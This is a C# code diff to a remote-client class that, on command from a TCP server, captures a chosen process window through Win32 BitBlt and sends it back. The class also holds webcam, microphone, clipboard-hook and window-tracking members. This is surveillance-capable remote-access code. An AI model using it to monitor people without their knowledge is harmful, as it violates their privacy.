@@ -22,6 +22,27 @@ namespace RemoteClient
 {
     public class RemoteClient
     {
+        [StructLayout(LayoutKind.Sequential)]
+        public struct RECT
+        {
+            public int Left;
+            public int Top;
+            public int Right;
+            public int Bottom;
+        }
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetWindowDC(IntPtr hWnd);
+
+        [DllImport("gdi32.dll")]
+        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest,
+            int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, CopyPixelOperation rop);
+
+        [DllImport("user32.dll")]
+        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        [DllImport("user32.dll")]
+        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
         private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
         private const uint MOUSEEVENTF_LEFTUP = 0x0004;
         private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
@@ -29,7 +50,7 @@ namespace RemoteClient
         private static NetworkStream ns;
         private static TcpClient server;
         private BinaryWriter bWrite;
-        private ChatForm chatForm;
+        // private ChatForm chatForm;
         private Thread chatThread;
         private int depth = 70;
         private Dispatcher dispatcher;
@@ -37,11 +58,11 @@ namespace RemoteClient
 
         private readonly bool distruct = false;
         private FoundInfoSyncHandler FoundInfo;
-        private ClipHook hookboard;
+        // private ClipHook hookboard;
         private bool isfile, arun;
         private bool isRemoteControlActive;
         private TreeNode node;
-        private DeviceNotification notifier;
+        // private DeviceNotification notifier;
         private bool olReceived, shot = false;
         private Thread realTimeScreenShootThread;
         private Thread realTimeTrackerThread;
@@ -56,6 +77,10 @@ namespace RemoteClient
         private ActiveWindowTracker tracker;
         private WaveInEvent waveIn;
         private Webcam webcam;
+        
+        private delegate void FoundInfoSyncHandler(FoundInfoEventArgs e);
+
+        private delegate void ThreadEndedSyncHandler(ThreadEndedEventArgs e);
 
 
         public RemoteClient()
@@ -163,8 +188,9 @@ namespace RemoteClient
         private string GetIpAddress()
         {
             //IPHostEntry ie = Dns.GetHostByName("DESKTOP-SH46CGE");
-            var ie = Dns.GetHostByName("DESKTOP-SH46CGE");
-            return ie.AddressList[0].ToString();
+            // var ie = Dns.GetHostByName("DESKTOP-SH46CGE");
+            // return ie.AddressList[0].ToString();
+            return "192.168.1.5";
         }
 
         private void StopRunningThreads()
@@ -422,83 +448,78 @@ namespace RemoteClient
                 }
             }
             else if (o.CommandType == "ProcessScreenshot")
+{
+    if (o.CommandName == "Capture")
+        try
+        {
+            string processId;
+            if (o.CommandData is object[] dataArray)
+                processId = dataArray[0].ToString();
+            else
+                processId = o.CommandData.ToString();
+
+            Debug.WriteLine($"Processing screenshot for process: {processId}");
+
+            var processIntId = int.Parse(processId);
+            var process = Process.GetProcessById(processIntId);
+            var hWnd = process.MainWindowHandle;
+
+            if (hWnd == IntPtr.Zero)
             {
-                if (o.CommandName == "Capture")
-                    try
-                    {
-                        var processId = o.CommandData.ToString();
-                        Debug.WriteLine($"Processing screenshot for process: {processId}");
-
-                        // Create directory if it doesn't exist
-                        var screenshotsDir = Path.Combine(
-                            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
-                            "ProcessScreenshots");
-
-                        if (!Directory.Exists(screenshotsDir))
-                            Directory.CreateDirectory(screenshotsDir);
-
-                        // Generate filename with process ID and timestamp
-                        var filename = Path.Combine(screenshotsDir,
-                            $"PID_{processId}_{DateTime.Now:yyyyMMddHHmmss}.jpg");
-
-                        byte[] imageBytes = null;
-
-                        // Attempt to take the screenshot
-                        using (var screenshot = new Bitmap(
-                                   Screen.PrimaryScreen.Bounds.Width,
-                                   Screen.PrimaryScreen.Bounds.Height))
-                        {
-                            using (var g = Graphics.FromImage(screenshot))
-                            {
-                                g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
-                            }
-
-                            // Convert the screenshot to a byte array
-                            using (var ms = new MemoryStream())
-                            {
-                                // Save with medium-high quality
-                                using (var encoderParams = new EncoderParameters(1))
-                                using (var qualityParam = new EncoderParameter(
-                                           Encoder.Quality, 80L))
-                                {
-                                    var jpegCodec = GetEncoderInfo("image/jpeg");
-                                    encoderParams.Param[0] = qualityParam;
-
-                                    screenshot.Save(ms, jpegCodec, encoderParams);
-                                    imageBytes = ms.ToArray();
-                                }
-                            }
-
-                            // Save the file locally
-                            File.WriteAllBytes(filename, imageBytes);
-
-                            Debug.WriteLine($"Screenshot saved locally: {filename}, size: {imageBytes.Length} bytes");
-                        }
-
-                        // Always send a response, even if the screenshot is null
-                        SendMessage(new DataObject
-                        {
-                            CommandType = "ProcessScreenshot",
-                            CommandName = "Result",
-                            CommandData = new object[] { processId, imageBytes }
-                        });
-
-                        Debug.WriteLine($"Screenshot response sent to server for process: {processId}");
-                    }
-                    catch (Exception ex)
-                    {
-                        // Log the error
-                        Debug.WriteLine($"Error taking process screenshot: {ex.Message}");
-
-                        // Always send an error response to prevent server waiting indefinitely
-                        SendMessage(new DataObject
-                        {
-                            CommandType = "ProcessScreenshot",
-                            CommandName = "Error",
-                            CommandData = new object[] { o.CommandData.ToString(), ex.Message }
-                        });
-                    }
+                Debug.WriteLine($"No window found for process: {processId}");
+                return;
             }
+
+            // Get window bounds
+            GetWindowRect(hWnd, out RECT rect);
+            int width = rect.Right - rect.Left;
+            int height = rect.Bottom - rect.Top;
+
+            using (Bitmap bmp = new Bitmap(width, height))
+            using (Graphics g = Graphics.FromImage(bmp))
+            {
+                IntPtr hdcBmp = g.GetHdc();
+                IntPtr hdcSrc = GetWindowDC(hWnd);
+
+                BitBlt(hdcBmp, 0, 0, width, height, hdcSrc, 0, 0, CopyPixelOperation.SourceCopy | CopyPixelOperation.CaptureBlt);
+
+                g.ReleaseHdc(hdcBmp);
+                ReleaseDC(hWnd, hdcSrc);
+
+                byte[] imageBytes;
+                using (var ms = new MemoryStream())
+                {
+                    using (var encoderParams = new EncoderParameters(1))
+                    using (var qualityParam = new EncoderParameter(Encoder.Quality, 80L))
+                    {
+                        var jpegCodec = GetEncoderInfo("image/jpeg");
+                        encoderParams.Param[0] = qualityParam;
+                        bmp.Save(ms, jpegCodec, encoderParams);
+                        imageBytes = ms.ToArray();
+                    }
+                }
+
+                SendMessage(new DataObject
+                {
+                    CommandType = "ProcessScreenshot",
+                    CommandName = "Result",
+                    CommandData = new object[] { processId, imageBytes }
+                });
+
+                Debug.WriteLine($"Window screenshot sent for process: {processId}");
+            }
+        }
+        catch (Exception ex)
+        {
+            Debug.WriteLine($"Error taking process screenshot: {ex.Message}");
+            SendMessage(new DataObject
+            {
+                CommandType = "ProcessScreenshot",
+                CommandName = "Error",
+                CommandData = new object[] { o.CommandData.ToString(), ex.Message }
+            });
+        }
+}
            
             else if (o.CommandType == "Webcam")
             {
@@ -773,56 +794,7 @@ namespace RemoteClient
                 LogError(e.ToString());
             }
         }
-
-
-        private bool GetSubDirectories(TreeNode parentNode)
-        {
-            try
-            {
-                string[] dirList;
-                if (Directory.Exists(parentNode.Tag.ToString()))
-                {
-                    try
-                    {
-                        dirList = Directory.GetDirectories(parentNode.Tag.ToString());
-                    }
-                    catch
-                    {
-                        dirList = null;
-                    }
-
-                    if (dirList != null)
-                    {
-                        Array.Sort(dirList);
-                        if (dirList.Length == parentNode.Nodes.Count)
-                            return false;
-
-                        for (var i = 0; i < dirList.Length; i++)
-                        {
-                            node = new TreeNode();
-                            node.Tag = dirList[i];
-                            node.Text = dirList[i].Substring(dirList[i].LastIndexOf(@"\") + 1);
-                            node.ImageKey = "Folder";
-                            node.SelectedImageKey = "Folder";
-                            parentNode.Nodes.Add(node);
-                        }
-
-                        return true;
-                    }
-
-                    return false;
-                }
-
-                return false;
-            }
-            catch (Exception e)
-            {
-                LogError(e.Message);
-                return false;
-            }
-        }
-
-
+        
         public static void SendMessage(object msg)
         {
 // Only send messages if consent is given
@@ -1103,9 +1075,6 @@ namespace RemoteClient
             return null;
         }
 
-        private delegate void FoundInfoSyncHandler(FoundInfoEventArgs e);
-
-        private delegate void ThreadEndedSyncHandler(ThreadEndedEventArgs e);
     }
 
 
